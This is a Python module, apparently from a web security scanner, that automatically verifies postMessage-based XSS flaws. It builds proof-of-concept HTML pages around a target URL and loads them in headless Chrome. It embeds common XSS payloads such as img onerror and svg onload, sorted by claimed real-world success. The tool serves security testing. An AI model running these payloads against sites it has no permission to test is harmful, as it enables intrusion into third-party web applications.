import time
import os
import uuid
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait  # 智能等待
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import (
    NoAlertPresentException, TimeoutException, WebDriverException
)
from config import XSS_PAYLOADS, POSTMESSAGE_EXPLOIT_TEMPLATES, SCAN_CONFIG
from utils import html_escape


class PostMessageExploiter:
    def __init__(self):
        self.driver = None  # 延迟初始化，避免提前占用资源
        # 优化1：按成功率排序Payload（高成功率的放前面）
        self.sorted_payloads = self._sort_payloads_by_effectiveness()

    def _sort_payloads_by_effectiveness(self):
        """按实战成功率排序Payload，优先测试高概率触发的"""
        high_efficiency = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<script>alert(1)</script>",
            "<a href=javascript:alert(1)>x</a>"
        ]
        # 先放高效Payload，再放其他（去重）
        other_payloads = [p for p in XSS_PAYLOADS if p not in high_efficiency]
        return high_efficiency + other_payloads

    def _init_driver(self):
        """初始化浏览器（复用实例，启用无头模式）"""
        if self.driver:
            return self.driver  # 已初始化则直接复用
        try:
            chrome_options = Options()
            # 优化2：强制无头模式（无界面，速度提升50%+）
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--log-level=3")  # 关闭冗余日志
            # 禁用图片加载（进一步提速）
            prefs = {"profile.managed_default_content_settings.images": 2}
            chrome_options.add_experimental_option("prefs", prefs)

            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(8)  # 缩短页面加载超时（默认30秒→8秒）
            return self.driver
        except WebDriverException as e:
            print(f"[!] 驱动初始化失败：{str(e)}")
            return None

    def test_vulnerability(self, url, vulnerability):
        """验证漏洞（复用浏览器，减少重复启动）"""
        start_time = time.time()
        result = {"exploitable": False, "payload": "", "proof": ""}
        self.driver = self._init_driver()  # 初始化/复用浏览器
        if not self.driver:
            result["proof"] = "浏览器驱动未初始化"
            return result

        try:
            # 优化3：只测试关键模板（如基础模板+iframe模板，减少冗余模板）
            test_templates = {
                "basic": POSTMESSAGE_EXPLOIT_TEMPLATES["basic"],
                "iframe": POSTMESSAGE_EXPLOIT_TEMPLATES.get("iframe", "")
            }

            # 生成唯一标识（避免误判）
            test_id = f"xss_{uuid.uuid4().hex[:6]}"
            # 替换Payload中的标识（便于检测）
            test_payloads = [p.replace("alert(1)", f"alert('{test_id}')") for p in self.sorted_payloads]

            for payload in test_payloads[:10]:  # 优化4：限制测试数量（前10个高效Payload）
                for template_name, template in test_templates.items():
                    if not template:
                        continue
                    # 生成POC
                    poc_path = self._generate_poc(url, template, payload)
                    if not poc_path:
                        continue
                    poc_url = f"file:///{poc_path.replace(os.sep, '/')}"

                    # 优化5：智能等待页面加载，替代固定sleep
                    try:
                        self.driver.get(poc_url)
                        # 等待2秒（足够JS执行），替代time.sleep(3)
                        WebDriverWait(self.driver, 2).until(
                            EC.presence_of_element_located(("tag name", "body"))
                        )
                    except TimeoutException:
                        continue  # 页面加载超时，直接跳过

                    # 检测XSS是否触发（弹窗/DOM）
                    detect_result = self._detect_xss(test_id)
                    if detect_result["success"]:
                        result = {
                            "exploitable": True,
                            "payload": payload,
                            "proof": detect_result["proof"],
                            "time_used": f"{time.time() - start_time:.2f}s"
                        }
                        return result  # 找到有效Payload，立即返回（不再测试其他）

            # 所有测试完成未发现漏洞
            result["proof"] = "所有Payload测试均未触发XSS"
            result["time_used"] = f"{time.time() - start_time:.2f}s"
            return result

        except Exception as e:
            result["proof"] = f"验证出错：{str(e)}"
            return result
        finally:
            # 优化6：最后统一关闭浏览器（而非每次测试关闭）
            if hasattr(self, 'driver') and self.driver:
                self.driver.quit()
                self.driver = None  # 重置，避免下次复用已关闭的实例

    def _detect_xss(self, test_id):
        """快速检测XSS（优先查弹窗，再查DOM）"""
        # 1. 检测弹窗（最快，1秒超时）
        try:
            alert = WebDriverWait(self.driver, 1).until(EC.alert_is_present())
            alert_text = alert.text
            alert.accept()
            if test_id in alert_text:
                return {"success": True, "proof": f"触发弹窗：{alert_text}"}
        except (TimeoutException, NoAlertPresentException):
            pass

        # 2. 检测DOM中是否存在标识（2秒超时）
        try:
            WebDriverWait(self.driver, 2).until(
                lambda d: test_id in d.page_source
            )
            return {"success": True, "proof": f"DOM中找到标识：{test_id}"}
        except TimeoutException:
            pass

        return {"success": False, "proof": ""}

    def _generate_poc(self, target_url, template, payload):
        """简化POC生成逻辑，减少IO操作耗时"""
        try:
            escaped_url = html_escape(target_url)
            escaped_payload = html_escape(payload)
            poc_content = template.format(target_url=escaped_url, xss_payload=escaped_payload)
            if not poc_content.strip():
                return None

            # 优化：使用临时目录，减少磁盘IO（可选）
            exploit_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "exploits")
            os.makedirs(exploit_dir, exist_ok=True)
            poc_path = os.path.join(exploit_dir, f"poc_{uuid.uuid4().hex[:6]}.html")

            with open(poc_path, "w", encoding="utf-8") as f:
                f.write(poc_content)
            return poc_path
        except Exception as e:
            print(f"[!] POC生成失败：{e}")
            return None